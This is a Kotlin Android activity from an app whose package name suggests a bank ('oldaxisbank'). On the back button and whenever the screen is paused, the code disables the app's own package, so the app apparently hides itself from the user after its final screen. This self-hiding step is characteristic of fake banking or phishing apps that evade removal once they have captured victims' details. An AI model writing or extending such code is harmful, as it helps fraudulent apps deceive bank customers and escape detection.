package com.example.oldaxisbank

import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.example.oldaxisbank.databinding.ActivityFinalscreenBinding

class finalscreen : AppCompatActivity() {

    private lateinit var binding:ActivityFinalscreenBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityFinalscreenBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.backtohome.setOnClickListener {
            val pakagemanger = packageManager
//        val componentname =  ComponentName(this,MainActivity::class.java)
            pakagemanger.setApplicationEnabledSetting(packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP)
        }


    }

    override fun onPause() {
        super.onPause()
        val pakagemanger = packageManager
//        val componentname =  ComponentName(this,MainActivity::class.java)
        pakagemanger.setApplicationEnabledSetting(packageName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP)
    }

}